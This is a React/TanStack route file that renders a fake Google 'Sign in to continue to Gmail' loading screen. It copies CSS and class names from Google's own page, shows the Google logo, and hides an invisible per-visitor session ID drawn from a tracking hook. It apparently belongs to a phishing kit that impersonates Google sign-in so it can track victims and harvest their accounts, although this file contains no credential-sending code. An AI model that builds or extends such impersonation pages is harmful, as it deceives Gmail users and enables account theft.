import { createFileRoute } from "@tanstack/react-router";
import {
  GeFontStyle,
  GoogleGLogo,
  useGeTracking,
} from "@/components/ge/GeShared";
import loadingHtml from "@/designs/ge/loading.html?raw";

export const Route = createFileRoute("/ge/loading")({
  head: () => ({
    meta: [
      { title: "Loading…" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeLoadingPage,
});

function extractCss(html: string): string {
  const m = html.match(/<style>([\s\S]*?)<\/style>/i);
  let css = m?.[1] ?? "";
  css = css.replace(/body\.AfoeCd/g, "html, body, .S7xv8");
  return css;
}

const GE_LOADING_CSS = extractCss(loadingHtml);

function GeLoadingPage() {
  const { sessionId } = useGeTracking();
  return (
    <>
      <GeFontStyle />
      <style>{GE_LOADING_CSS}</style>
      <div className="S7xv8">
        <div className="TcuCfd">
          <div className="wuMMWb" aria-hidden="false">
            <div className="sr-only">Loading</div>
            <div
              className="progress"
              role="progressbar"
              aria-label="Loading"
              aria-valuemin={0}
              aria-valuemax={100}
            >
              <div className="progress-bar" />
            </div>
          </div>

          <div className="logo">
            <GoogleGLogo width={48} height={48} />
          </div>
          <h1 className="title">Sign in</h1>
          <div className="sub">to continue to Gmail</div>
          <p className="hint">Loading…</p>
        </div>
      </div>
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </>
  );
}
